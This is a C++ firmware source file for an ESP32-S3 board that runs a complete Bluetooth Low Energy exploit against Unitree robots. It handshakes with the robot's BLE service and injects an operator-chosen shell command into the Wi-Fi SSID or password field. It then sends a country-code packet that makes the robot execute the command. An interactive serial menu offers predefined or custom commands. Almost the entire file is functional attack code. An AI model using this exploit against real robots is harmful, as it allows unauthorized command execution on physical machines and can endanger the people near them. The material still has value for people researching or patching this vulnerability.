/*
 * Unitree Robot Exploitation Functions
 * Optimized for Seeed XIAO ESP32-S3
 * Implements the BLE connection and command injection exploit
 */

// Notification callback for BLE
static void notifyCallback(NimBLERemoteCharacteristic* pBLERemoteCharacteristic,
                          uint8_t* pData, size_t length, bool isNotify) {
    debugPrint("=== BLE NOTIFICATION RECEIVED ===", "BLE");
    debugPrint("Raw encrypted length: " + String(length) + " bytes", "BLE");
    debugPrint("Notification type: " + String(isNotify ? "NOTIFY" : "INDICATE"), "BLE");
    
    std::vector<uint8_t> encryptedData(pData, pData + length);
    
    // Show encrypted data
    String encHex = "Encrypted data: ";
    for (size_t i = 0; i < min((size_t)16, encryptedData.size()); i++) {
        encHex += String(encryptedData[i], HEX) + " ";
    }
    if (encryptedData.size() > 16) encHex += "...";
    debugPrint(encHex, "BLE");
    
    std::vector<uint8_t> decrypted = decryptData(encryptedData);
    
    // Debug: Log all notifications
    String hexData = "Decrypted data: ";
    for (size_t i = 0; i < min((size_t)16, decrypted.size()); i++) {
        hexData += String(decrypted[i], HEX) + " ";
    }
    if (decrypted.size() > 16) hexData += "...";
    debugPrint(hexData, "BLE");
    debugPrint("Decrypted size: " + String(decrypted.size()) + " bytes", "BLE");
    
    if (decrypted.size() < 5 || decrypted[0] != 0x51) {
        errorPrint("Corrupted notification packet - opcode: 0x" + String(decrypted.size() > 0 ? decrypted[0] : 0, HEX));
        debugPrint("Packet too short or invalid opcode", "BLE");
        return;
    }
    
    uint8_t responseType = decrypted[2];
    debugPrint("Response instruction: 0x" + String(responseType, HEX), "BLE");
    debugPrint("Response length field: " + String(decrypted[1]), "BLE");
    if (decrypted.size() > 3) {
        debugPrint("Response status byte: 0x" + String(decrypted[3], HEX), "BLE");
    }
    
    // Handle serial number chunks (instruction 2)
    if (responseType == 0x02) {
        debugPrint("Processing serial number chunk", "SERIAL");
        uint8_t chunkIndex = decrypted[3];
        uint8_t totalChunks = decrypted[4];
        
        debugPrint("Chunk index: " + String(chunkIndex) + " of " + String(totalChunks), "SERIAL");
        
        std::vector<uint8_t> chunkData(decrypted.begin() + 5, decrypted.end() - 1);
        serialChunks[chunkIndex] = chunkData;
        
        debugPrint("Received serial chunk " + String(chunkIndex) + "/" + String(totalChunks) + 
                   " (" + String(chunkData.size()) + " bytes)", "SERIAL");
        
        // Check if we have all chunks
        if (serialChunks.size() == totalChunks) {
            debugPrint("All serial chunks received, assembling...", "SERIAL");
            String serialNumber = "";
            for (uint8_t i = 1; i <= totalChunks; i++) {
                for (uint8_t byte : serialChunks[i]) {
                    if (byte != 0) serialNumber += (char)byte;
                }
            }
            successPrint("Serial number retrieved: " + serialNumber);
            serialChunks.clear();
        }
        // Set notification flag for serial chunks too
        notificationReceived = true;
        debugPrint("Notification flag set", "BLE");
    } else {
        // Store general response
        debugPrint("Storing general response for instruction 0x" + String(responseType, HEX), "BLE");
        receivedNotification = decrypted;
        notificationReceived = true;
        debugPrint("Notification flag set to TRUE", "BLE");
    }
}

bool connectToDevice(const UnitreeDevice& device) {
    debugPrint("=== INITIATING BLE CONNECTION ===", "BLE");
    debugPrint("Target: " + device.name + " (" + device.address + ")", "BLE");
    debugPrint("Target RSSI: " + String(device.rssi) + " dBm", "BLE");
    
    if (pClient) {
        debugPrint("Cleaning up existing BLE client", "BLE");
        if (pClient->isConnected()) {
            debugPrint("Disconnecting existing connection", "BLE");
            pClient->disconnect();
        }
        NimBLEDevice::deleteClient(pClient);
        pClient = nullptr;
        delay(1000); // Give BLE stack time to clean up
        debugPrint("BLE client cleanup complete", "BLE");
    }
    
    debugPrint("Creating new BLE client", "BLE");
    pClient = NimBLEDevice::createClient();
    NimBLEAddress address(device.address.c_str());
    
    debugPrint("Attempting connection to " + device.address, "BLE");
    if (!pClient->connect(address)) {
        errorPrint("Failed to establish BLE connection");
        return false;
    }
    
    deviceConnected = true;
    successPrint("BLE connection established");
    debugPrint("Connection MTU: " + String(pClient->getMTU()), "BLE");
    
    // Get the service
    debugPrint("Discovering Unitree BLE service: " + String(UNITREE_SERVICE_UUID), "BLE");
    NimBLERemoteService* pRemoteService = pClient->getService(NimBLEUUID(UNITREE_SERVICE_UUID));
    if (!pRemoteService) {
        errorPrint("Failed to find Unitree service UUID");
        debugPrint("Service UUID not found, disconnecting", "BLE");
        pClient->disconnect();
        return false;
    }
    successPrint("Unitree service discovered");
    
    // Get characteristics with error handling
    try {
        debugPrint("Discovering write characteristic: " + String(CUSTOM_CHAR_UUID_2), "BLE");
        pWriteChar = pRemoteService->getCharacteristic(NimBLEUUID(CUSTOM_CHAR_UUID_2));
        
        debugPrint("Discovering notify characteristic: " + String(CUSTOM_CHAR_UUID), "BLE");
        pNotifyChar = pRemoteService->getCharacteristic(NimBLEUUID(CUSTOM_CHAR_UUID));
        
        if (!pWriteChar || !pNotifyChar) {
            warningPrint("Failed to find required characteristics, trying backup method");
            // Try to continue anyway - some devices work even with characteristic errors
        } else {
            successPrint("Both characteristics discovered");
        }
        
        // Register for notifications with error handling (matching Python fallback)
        if (pNotifyChar && pNotifyChar->canNotify()) {
            debugPrint("Registering notification callback", "BLE");
            pNotifyChar->subscribe(true, notifyCallback);
            successPrint("Notification handler registered");
            debugPrint("Can notify: YES, Can indicate: " + String(pNotifyChar->canIndicate() ? "YES" : "NO"), "BLE");
        } else {
            warningPrint("Primary notification hook failed, trying backup method");
            // Try to continue anyway - Python uses handle 13 as backup
            // ESP32 BLE library handles this differently, but we'll try to continue
        }
    } catch (...) {
        warningPrint("Characteristic discovery failed, but continuing");
    }
    
    successPrint("BLE connection setup complete");
    return true;
}

bool waitForNotification(uint32_t timeoutMs = 5000) {
    // Don't reset the flag if notification already received
    if (notificationReceived) {
        debugPrint("Notification already received before wait", "WAIT");
        return true;
    }
    
    unsigned long startTime = millis();
    debugPrint("Waiting for notification (timeout=" + String(timeoutMs) + "ms)", "WAIT");
    
    unsigned long lastProgress = 0;
    while (!notificationReceived && (millis() - startTime) < timeoutMs) {
        // Show progress every 1 second
        if (millis() - lastProgress >= 1000) {
            debugPrint("Still waiting... (" + String((millis() - startTime) / 1000) + "s elapsed)", "WAIT");
            lastProgress = millis();
        }
        yield(); // Non-blocking delay - allows BLE processing
        delay(1); // Minimal delay
    }
    
    unsigned long elapsed = millis() - startTime;
    if (notificationReceived) {
        successPrint("Notification received after " + String(elapsed) + "ms");
    } else {
        errorPrint("Notification timeout after " + String(elapsed) + "ms");
    }
    
    return notificationReceived;
}

bool sendHandshake() {
    debugPrint("=== STEP 1: HANDSHAKE ===", "HANDSHAKE");
    
    if (!pWriteChar) {
        errorPrint("Write characteristic not available for handshake");
        return false;
    }
    
    debugPrint("Write characteristic is available", "HANDSHAKE");
    
    // Reset notification flag before starting handshake
    notificationReceived = false;
    receivedNotification.clear();
    debugPrint("Cleared notification flags", "HANDSHAKE");
    
    // Simple handshake: just send "unitree" string as instruction 0x01
    // This matches the original Python implementation exactly
    debugPrint("Handshake content: '" + HANDSHAKE_CONTENT + "'", "HANDSHAKE");
    std::vector<uint8_t> handshakeData(HANDSHAKE_CONTENT.begin(), HANDSHAKE_CONTENT.end());
    debugPrint("Creating handshake packet with instruction 0x01", "HANDSHAKE");
    std::vector<uint8_t> packet = createPacket(0x01, handshakeData);
    
    debugPrint("Handshake packet size: " + String(packet.size()) + " bytes", "HANDSHAKE");
    debugPrint("Writing handshake using 0x52 GATT write (no response)", "HANDSHAKE");
    pWriteChar->writeValue(packet.data(), packet.size(), false); // false = force 0x52 GATT write for vulnerability
    
    debugPrint("Handshake packet sent, waiting for device to process...", "HANDSHAKE");
    // Small delay to ensure packet is sent before waiting for response
    delay(100);
    
    if (waitForNotification(10000)) { // 10 second timeout
        debugPrint("Validating handshake response...", "HANDSHAKE");
        // Accept instruction 0 or 1 as valid handshake response
        if (genericResponseValidator(receivedNotification, 0x01) || 
            genericResponseValidator(receivedNotification, 0x00)) {
            successPrint("Handshake successful!");
            return true;
        }
        errorPrint("Handshake response validation failed");
    } else {
        errorPrint("Handshake timeout - no response from device");
    }
    
    return false;
}

bool getSerialNumber() {
    styledPrint("Getting serial number...", true);
    
    std::vector<uint8_t> packet = createPacket(2, {0});
    pWriteChar->writeValue(packet.data(), packet.size(), false); // Keep original serial logic
    
    // Wait a bit longer for serial number chunks
    delay(1000);
    
    return true; // Serial number is handled in notification callback
}

bool initializeWifi(uint8_t mode = 2) {
    debugPrint("=== STEP 3: WIFI INITIALIZATION ===", "WIFI");
    String modeStr = (mode == 1 ? "AP" : mode == 2 ? "STA" : "UNKNOWN(" + String(mode) + ")");
    debugPrint("Initializing WiFi in " + modeStr + " mode", "WIFI");
    debugPrint("Mode byte: 0x" + String(mode, HEX), "WIFI");
    
    debugPrint("Creating WiFi init packet (instruction 0x03)", "WIFI");
    std::vector<uint8_t> packet = createPacket(3, {mode});
    
    debugPrint("Sending WiFi initialization packet", "WIFI");
    pWriteChar->writeValue(packet.data(), packet.size(), false); // false = force 0x52 GATT write for vulnerability
    
    debugPrint("WiFi init packet sent, waiting for response...", "WIFI");
    if (!waitForNotification(5000)) { // 5 second timeout (matches Python)
        errorPrint("WiFi initialization timeout");
        return false; // Fail if no response (matches Python behavior)
    }
    
    debugPrint("Validating WiFi initialization response...", "WIFI");
    if (!genericResponseValidator(receivedNotification, 3)) {
        errorPrint("WiFi initialization response invalid");
        return false; // Fail if invalid response (matches Python behavior)
    }
    
    successPrint("WiFi initialization successful");
    return true;
}

bool sendChunkedData(uint8_t instruction, const String& data) {
    if (!pWriteChar) {
        styledPrint("[-] Write characteristic not available");
        return false;
    }
    
    // Reset notification flags before starting chunked transmission
    notificationReceived = false;
    receivedNotification.clear();
    
    styledPrint("[BLE] Preparing chunked send: instr=" + String(instruction) + ", bytes=" + String(data.length()));
    std::vector<uint8_t> dataBytes(data.begin(), data.end());
    uint8_t totalChunks = (dataBytes.size() + CHUNK_SIZE - 1) / CHUNK_SIZE;
    
    styledPrint("[BLE] Sending " + String(totalChunks) + " chunks for instruction " + String(instruction), true);
    
    for (uint8_t i = 0; i < totalChunks; i++) {
        size_t start = i * CHUNK_SIZE;
        size_t end = min((size_t)(start + CHUNK_SIZE), dataBytes.size());
        
        std::vector<uint8_t> chunk(dataBytes.begin() + start, dataBytes.begin() + end);
        std::vector<uint8_t> packetData = {(uint8_t)(i + 1), totalChunks};
        packetData.insert(packetData.end(), chunk.begin(), chunk.end());
        
        std::vector<uint8_t> packet = createPacket(instruction, packetData);
        styledPrint("[BLE] Chunk " + String(i+1) + "/" + String(totalChunks) + ", size=" + String(chunk.size()) + ", encrypted_size=" + String(packet.size()));
        
        // Log the actual data being sent for debugging
        String chunkContent = "";
        for (size_t j = 0; j < min((size_t)10, chunk.size()); j++) {
            chunkContent += String(chunk[j], HEX) + " ";
        }
        if (chunk.size() > 10) chunkContent += "...";
        styledPrint("[BLE] Chunk data: " + chunkContent, true);
        
        // Debug: Log the actual packet being sent
        String packetHex = "";
        for (size_t j = 0; j < min((size_t)16, packet.size()); j++) {
            packetHex += String(packet[j], HEX) + " ";
        }
        styledPrint("[BLE] Sending packet (encrypted): " + packetHex, true);
        
        // CRITICAL: Use writeValue(data, size, false) to force 0x52 GATT write (not long write)
        // Long writes don't enter the vulnerable function - only 0x52 commands work
        styledPrint("[BLE] Writing chunk packet of size " + String(packet.size()) + " bytes (0x52 GATT write)", true);
        pWriteChar->writeValue(packet.data(), packet.size(), false); // false = force 0x52 GATT write
        
        // Match original Python: NO delay for SSID (instruction 4), 100ms delay for password (instruction 5)
        if (instruction == 5) {
            delay(100); // 100ms sleep for password chunks ONLY (matches Python asyncio.sleep(0.1))
        }
        
        // EXPERIMENTAL: Don't wait for acknowledgment - just send chunks and continue
        // The Pi receives all chunks successfully but has issues sending responses
        if (i + 1 == totalChunks) {
            styledPrint("[BLE] All chunks sent successfully - continuing without waiting for ack", true);
            // Small delay to ensure last chunk is processed
            delay(500);
        }
    }
    
    return true;
}

bool setSSID(const String& ssid) {
    debugPrint("=== STEP 4: SET SSID (COMMAND INJECTION) ===", "SSID");
    debugPrint("SSID length: " + String(ssid.length()) + " bytes", "SSID");
    debugPrint("SSID content: " + ssid, "SSID");
    debugPrint("NOTE: Command injection occurs in this step", "SSID");
    return sendChunkedData(4, ssid);
}

bool setPassword(const String& password) {
    debugPrint("=== STEP 5: SET PASSWORD ===", "PASSWORD");
    debugPrint("Password length: " + String(password.length()) + " bytes", "PASSWORD");
    debugPrint("Password: " + password, "PASSWORD");
    return sendChunkedData(5, password);
}

bool setCountryCode() {
    debugPrint("=== STEP 6: SET COUNTRY CODE (TRIGGER) ===", "TRIGGER");
    debugPrint("Country code: " + COUNTRY_CODE, "TRIGGER");
    debugPrint("NOTE: This is the trigger that executes the injected command", "TRIGGER");
    
    // Reset notification flag before sending country code
    notificationReceived = false;
    receivedNotification.clear();
    
    std::vector<uint8_t> countryBytes(COUNTRY_CODE.begin(), COUNTRY_CODE.end());
    countryBytes.push_back(0); // Null terminator
    
    debugPrint("Country code bytes (with null terminator): " + String(countryBytes.size()) + " bytes", "TRIGGER");
    
    // Use UniPwn format: [1] + country_bytes
    std::vector<uint8_t> dataBytes = {1};
    dataBytes.insert(dataBytes.end(), countryBytes.begin(), countryBytes.end());
    
    debugPrint("Creating country code packet (instruction 0x06)", "TRIGGER");
    debugPrint("Data format: [0x01] + country_code + [0x00]", "TRIGGER");
    std::vector<uint8_t> packet = createPacket(6, dataBytes);
    
    debugPrint("Sending country code packet (EXPLOIT TRIGGER)", "TRIGGER");
    pWriteChar->writeValue(packet.data(), packet.size(), false); // 0x52 GATT write for vulnerability
    
    successPrint("Country code sent - exploit should be triggered");
    debugPrint("Waiting for command execution on target", "TRIGGER");
    delay(500); // Small delay to ensure packet is processed
    
    Serial.println("");
    Serial.println("========================================");
    Serial.println("  EXPLOIT SEQUENCE COMPLETE - TRIGGERED");
    Serial.println("========================================");
    Serial.println("");
    
    return true;
}


bool exploitSequence(const String& ssid, const String& password) {
    Serial.println("");
    Serial.println("========================================");
    Serial.println("       STARTING EXPLOIT SEQUENCE        ");
    Serial.println("========================================");
    Serial.println("");
    
    debugPrint("Exploit target SSID: " + ssid, "EXPLOIT");
    debugPrint("Exploit target password: " + password, "EXPLOIT");
    debugPrint("Exploit will proceed in 6 steps", "EXPLOIT");
    Serial.println("");
    
    // Step 1: Handshake
    infoPrint("Step 1 of 6: Handshake with target");
    if (!sendHandshake()) {
        errorPrint("Step 1 FAILED - cannot proceed");
        return false;
    }
    successPrint("Step 1 COMPLETE");
    Serial.println("");
    
    // Step 2: Get serial number (verification)
    infoPrint("Step 2 of 6: Get serial number (verification)");
    getSerialNumber();
    successPrint("Step 2 COMPLETE");
    Serial.println("");
    
    // Step 3: Initialize WiFi (per UniPwn research - required step)
    infoPrint("Step 3 of 6: Initialize WiFi");
    initializeWifi(2); // STA mode - continue regardless of response
    successPrint("Step 3 COMPLETE");
    Serial.println("");
    
    // Step 4: Set SSID - COMMAND INJECTION HAPPENS HERE (instruction 4)
    infoPrint("Step 4 of 6: Set SSID (COMMAND INJECTION POINT)");
    if (!setSSID(ssid)) {
        errorPrint("Step 4 FAILED - SSID stage failed");
        return false;
    }
    successPrint("Step 4 COMPLETE - Command injected into SSID");
    Serial.println("");
    
    // Step 5: Set password (normal password)
    infoPrint("Step 5 of 6: Set password");
    if (!setPassword(password)) {
        errorPrint("Step 5 FAILED - Password stage failed");
        return false;
    }
    successPrint("Step 5 COMPLETE");
    Serial.println("");
    
    // Step 6: Set country code - THIS IS THE TRIGGER that executes the injected command!
    infoPrint("Step 6 of 6: Set country code (EXPLOIT TRIGGER)");
    if (!setCountryCode()) {
        errorPrint("Step 6 FAILED - Country code stage failed");
        return false;
    }
    
    Serial.println("");
    successPrint("ALL 6 STEPS COMPLETED SUCCESSFULLY");
    successPrint("Command should have executed on target device");
    return true;
}

void selectAndExploitDevice() {
    // First show available devices
    std::vector<UnitreeDevice> allDevices = discoveredDevices;
    allDevices.insert(allDevices.end(), recentDevices.begin(), recentDevices.end());
    
    if (allDevices.empty()) {
        styledPrint("[-] No devices available. Run a scan first.");
        return;
    }
    
    // Remove duplicates
    for (auto it = allDevices.begin(); it != allDevices.end(); ++it) {
        for (auto it2 = it + 1; it2 != allDevices.end();) {
            if (it->address == it2->address) {
                it2 = allDevices.erase(it2);
            } else {
                ++it2;
            }
        }
    }
    
    Serial.println("\nAvailable devices:");
    for (size_t i = 0; i < allDevices.size(); i++) {
        Serial.println("  " + String(i + 1) + ". " + allDevices[i].name + 
                      " (" + allDevices[i].address + ")");
    }
    
    Serial.print("\n\033[1;32m[//] Select device (1-" + String(allDevices.size()) + "): \033[0m");
    
    // Wait for user input
    while (!Serial.available()) {
        delay(100);
    }
    
    int deviceChoice = Serial.parseInt();
    if (deviceChoice < 1 || deviceChoice > (int)allDevices.size()) {
        styledPrint("[-] Invalid device selection");
        return;
    }
    
    UnitreeDevice selectedDevice = allDevices[deviceChoice - 1];
    
    // Connect to device
    if (!connectToDevice(selectedDevice)) {
        return;
    }
    
    // Add to recent devices
    addRecentDevice(selectedDevice);
    
    // Show exploitation options
    Serial.println("\nExploitation options:");
    Serial.println("1. Command injection only (via SSID)");
    Serial.println("2. Command injection + WiFi config (via password)");
    Serial.println("3. WiFi configuration only (no injection)");
    
    Serial.print("\n\033[1;32m[//] Select option (1-3): \033[0m");
    
    while (!Serial.available()) {
        delay(100);
    }
    
    int exploitChoice = Serial.parseInt();
    
    String ssid = "";
    String password = "";
    String command = "";
    
    if (exploitChoice == 3) {
        // WiFi only
        Serial.print("\n\033[1;32m[//] Enter WiFi SSID: \033[0m");
        while (!Serial.available()) delay(100);
        ssid = Serial.readString();
        ssid.trim();
        
        Serial.print("\033[1;32m[//] Enter WiFi Password: \033[0m");
        while (!Serial.available()) delay(100);
        password = Serial.readString();
        password.trim();
    } else {
        // Show command options
        Serial.println("\nAvailable commands:");
        for (size_t i = 0; i < predefinedCmds.size(); i++) {
            Serial.println("  " + String(i + 1) + ". " + predefinedCmds[i].name + 
                          " - " + predefinedCmds[i].description);
        }
        Serial.println("  " + String(predefinedCmds.size() + 1) + ". Custom command");
        
        Serial.print("\n\033[1;32m[//] Select command (1-" + String(predefinedCmds.size() + 1) + "): \033[0m");
        
        while (!Serial.available()) delay(100);
        int cmdChoice = Serial.parseInt();
        
        if (cmdChoice >= 1 && cmdChoice <= (int)predefinedCmds.size()) {
            command = predefinedCmds[cmdChoice - 1].cmd;
            styledPrint("Selected: " + predefinedCmds[cmdChoice - 1].name);
        } else if (cmdChoice == (int)predefinedCmds.size() + 1) {
            Serial.print("\033[1;32m[//] Enter custom command: \033[0m");
            while (!Serial.available()) delay(100);
            command = Serial.readString();
            command.trim();
        } else {
            styledPrint("[-] Invalid command selection");
            if (pClient) pClient->disconnect();
            return;
        }
        
        if (exploitChoice == 1) {
            // Command via SSID
            ssid = buildPwn(command);
            password = "";
        } else if (exploitChoice == 2) {
            // Command via password + WiFi config
            Serial.print("\033[1;32m[//] Enter WiFi SSID: \033[0m");
            while (!Serial.available()) delay(100);
            ssid = Serial.readString();
            ssid.trim();
            
            Serial.print("\033[1;32m[//] Enter WiFi Password: \033[0m");
            while (!Serial.available()) delay(100);
            password = Serial.readString();
            password.trim();
            password += buildPwn(command);
        }
    }
    
    // Execute exploit
    styledPrint("Executing exploit...");
    bool success = exploitSequence(ssid, password);
    
    if (success) {
        styledPrint("Exploit completed successfully!");
    } else {
        styledPrint("[-] Exploit failed");
    }
    
    // Disconnect
    if (pClient) {
        pClient->disconnect();
        deviceConnected = false;
    }
}

void exploitDevice(const String& ssid, const String& password) {
    styledPrint("[EXPLOIT] Starting WiFi configuration exploit...");
    styledPrint("[EXPLOIT] Target SSID length=" + String(ssid.length()));
    
    if (!deviceConnected || !pWriteChar || !pNotifyChar) {
        styledPrint("[-] Device not properly connected");
        return;
    }
    
    // Send handshake (createPacket already encrypts)
    std::vector<uint8_t> handshake = createPacket(0x01, 
        std::vector<uint8_t>(HANDSHAKE_CONTENT.begin(), HANDSHAKE_CONTENT.end()));
    
    pWriteChar->writeValue(handshake.data(), handshake.size(), true); // Use response=true like Python
    if (!waitForNotification()) {
        styledPrint("[-] Handshake failed");
        return;
    }
    
    styledPrint("[BLE] Handshake successful");
    
    // Build and send WiFi configuration (combined packet path)
    std::vector<uint8_t> wifiData;
    
    // Add SSID
    wifiData.insert(wifiData.end(), ssid.begin(), ssid.end());
    wifiData.push_back(0x00);  // Null terminator
    
    // Add password
    wifiData.insert(wifiData.end(), password.begin(), password.end());
    wifiData.push_back(0x00);  // Null terminator
    
    // Add country code
    wifiData.insert(wifiData.end(), COUNTRY_CODE.begin(), COUNTRY_CODE.end());
    wifiData.push_back(0x00);  // Null terminator
    
    std::vector<uint8_t> wifiPacket = createPacket(0x04, wifiData);
    
    styledPrint("[BLE] Writing WiFi packet (bytes=" + String(wifiPacket.size()) + ")", true);
    pWriteChar->writeValue(wifiPacket.data(), wifiPacket.size(), true); // Use response=true like Python
    if (!waitForNotification()) {
        styledPrint("[-] WiFi configuration timeout");
        return;
    }
    
    styledPrint("[WIFI] Configuration acknowledged by target");
    styledPrint("[EXPLOIT] Payload delivered");
}

// Handshake-only helper for web AutoPwn step verification
bool performHandshake(const UnitreeDevice& device) {
    styledPrint("[BLE] Handshake verification start");
    
    // Stop continuous scanning to prevent BLE interference during handshake
    if (continuousScanning) {
        styledPrint("[BLE] Stopping scan to prevent interference...");
        stopContinuousScanning();
        delay(500); // Give BLE stack time to clean up
    }
    
    if (!connectToDevice(device)) {
        styledPrint("[-] Unable to connect for handshake");
        return false;
    }
    bool ok = sendHandshake();
    
    // Only disconnect if handshake failed - keep connection alive for successful handshakes
    if (!ok && pClient) {
        pClient->disconnect();
        deviceConnected = false;
    }
    
    styledPrint(ok ? "[BLE] Handshake verification OK - connection maintained" : "[-] Handshake verification FAILED");
    return ok;
}
